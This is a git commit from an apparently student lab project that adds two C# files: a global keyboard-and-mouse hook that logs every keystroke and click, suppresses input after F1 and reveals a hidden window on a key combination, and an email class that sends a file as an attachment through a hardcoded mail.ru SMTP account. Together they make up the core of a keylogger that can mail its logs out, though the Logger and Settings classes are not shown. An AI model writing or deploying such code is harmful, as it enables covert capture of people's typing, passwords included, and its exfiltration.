8010d140e88f1c45b3c0c847d61e3df490f696de
Nickolai  Shlyahtovich 550502 <nickolai.shlyahtovich@gmail.com>
2017-12-22 19:27:07 +0300

    Add files via upload

---
+++ Lab8_hooks/EmailManager.cs
@@ -0,0 +1,34 @@
+﻿using System.Net.Mail;
+
+namespace Laba_8
+{
+    class EmailManager
+    {
+        private readonly SmtpClient _smtpClient;
+       
+        private const string sender = "nickoliuzzzzz@mail.ru";
+        private const string password = "";
+
+        private const string host = "smtp.mail.ru";
+        private const int port = 587;
+
+        public EmailManager()
+        {
+            _smtpClient = new SmtpClient(host, port)
+            {
+                Credentials = new System.Net.NetworkCredential(sender, password),
+                EnableSsl = true
+            };
+        }
+
+        public void SendEmail(string receiver, string topic, string filePath)
+        {
+            var mail = new MailMessage(sender, receiver, topic, string.Empty);
+            using (var  attachment = new Attachment(filePath))
+            {
+                mail.Attachments.Add(attachment);
+                _smtpClient.Send(mail);
+            }
+        }
+    }
+}
---
+++ Lab8_hooks/GlobalHooks.cs
@@ -0,0 +1,62 @@
+﻿using Gma.System.MouseKeyHook;
+using System.Windows.Forms;
+using System.Diagnostics;
+using System.Threading;
+using System;
+
+namespace Laba_8
+{
+    public class GlobalHooks
+    {
+        public delegate void WindowShowHandler();
+
+        private readonly IKeyboardMouseEvents _globalHooks = Hook.GlobalEvents();
+        private readonly Logger _logger;
+        private readonly Settings _settings;
+        private readonly WindowShowHandler _windowShow;
+        private  System.Threading.Timer timer;
+        public static bool flag = true;
+
+        public GlobalHooks(Settings config, WindowShowHandler windowShow)
+        {
+            _settings = config;
+            _windowShow = windowShow;
+            _logger = new Logger(_settings);
+            _globalHooks.KeyDown += KeyEvent;
+            _globalHooks.MouseClick += MouseEvent;
+        }
+        private void KeyEvent(object sender, KeyEventArgs e)
+        {
+            if (_settings.IsHooks)
+            {
+                if (e.KeyData == (Keys.F1))
+                {
+                    flag = false;
+                    timer = new System.Threading.Timer(Timerr, null, 5000, 0);
+                }
+                e.SuppressKeyPress = flag ?  false : true;
+                _logger.KeyLogger(e.KeyData.ToString());
+            }
+            if (e.KeyData == (Keys.Control | Keys.LMenu))
+            {
+                if (_windowShow != null)
+                {
+                    _windowShow.Invoke();
+                }
+            }
+        }
+
+        public static void Timerr(object e)
+        {
+            flag = true;
+        }
+
+        private void MouseEvent(object sender, MouseEventArgs e)
+        {
+            if (_settings.IsHooks)
+            {
+                _logger.MouseLogger(e.Button.ToString(), e.Location.ToString());
+            }
+        }
+    }
+}
